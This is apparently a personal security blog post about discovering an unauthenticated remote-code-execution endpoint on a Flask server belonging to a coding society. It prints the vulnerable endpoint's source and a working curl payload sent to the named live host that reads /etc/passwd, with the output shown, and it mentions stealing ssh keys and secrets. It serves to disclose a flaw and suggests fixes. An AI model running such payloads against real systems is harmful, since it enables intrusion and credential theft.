+++
title = "Smashing Mort's Server for Fun and No Profit 2"
description = "Ended up discovering a pretty critical RCE on the deployed server"
date = 2025-12-10
+++

Following the previous post, I had some ideas to try running a new path traversal technique and maybe searching for some other data leakage. 

## Another Path Traversal?

I ended up finding that the method to update `uid` contained the same flaw in parsing (with both the `os.path.join()` and the particular setter which allowed for file paths to be inserted):

```py
# model/user.py
@uid.setter
def user_id(self, uid):
    self._uid = uid
```

To my dismay, however, a check is run on `uid` to check whether or not it is a valid GitHub ID:

```py
# api/user.py
# check if uid is a GitHub account
_, status = GitHubUser().get(uid)
if status != 200:
    return {'message': f'User ID {uid} not a valid GitHub account' },
```

and thus:
```bash
curl -X PUT http://localhost:8001/api/user \
> -b cookie_regular.txt \
> -H "Content-Type: application/json" \
> -d '{ "uid": "test" }'
```

```json
{
    "message": "User ID test not a valid GitHub account"
}
```

## The RCE

While searching for another avenue of exploitation, I came across a function which allows for Python code the be executed with little to no moderation. Basically arbitrary code execution.

```py
# /api/python_exec_api.py
from flask import Blueprint, request, jsonify
from flask_restful import Api, Resource
import subprocess, tempfile, os

python_exec_api = Blueprint('python_exec_api', __name__, url_prefix='/run')
api = Api(python_exec_api)

class PythonExec(Resource):
    def post(self):
        """Executes submitted Python code safely in a short-lived subprocess."""
        data = request.get_json()
        code = data.get("code", "")

        if not code.strip():
            return {"output": "⚠️ No code provided."}, 400

        with tempfile.NamedTemporaryFile(delete=False, suffix=".py") as tmp:
            tmp.write(code.encode())
            tmp.flush()

            try:
                result = subprocess.run(
                    ["python3", tmp.name],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                output = result.stdout + result.stderr
            except subprocess.TimeoutExpired:
                output = "⏱️ Execution timed out (5 s limit)."
            except Exception as e:
                output = f"Error running code: {str(e)}"
            finally:
                os.unlink(tmp.name)

        return {"output": output}

api.add_resource(PythonExec, "/python")
```

The endpoint allows **unauthenticated** arbitrary code execution! Huzzah! So, both locally *AND* online, I can send web requests to execute Python code.

So, for example, I can grab `/etc/passwd`:
```bash
curl -X POST https://flask.opencodingsociety.com/run/python \
-H "Content-Type: application/json" \
-d '{"code": "import os; print(os.popen(\"cat /etc/passwd\").read())"}'
```
```json
{"output": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n\n"}
```

I can also grab ssh keys. I can even grab the `.env` if I wanted to, which would in theory expose the admin password, recovery passwords, db passwords, API keys, etc. I could also open reverse shells to gain *complete* access to the server if I wanted to. I can install malware, deface the website, DOS the server... the possibilities are endless.

In short, I smashed it.


## Solutions

The best solution, of course, would be to remove the endpoint entirely, but I haven't done much investigation into what (if anything) is even using this endpoint. As of now, the server is completely open to anybody running arbitrary code on the server, so I guess better me find it than some random person online :D

I'm sure there's likely some way to only permit authenticated people to use the endpoint (and giving that perm to only a few people), but really there's no good way to prevent an RCE with an open endpoint like this.
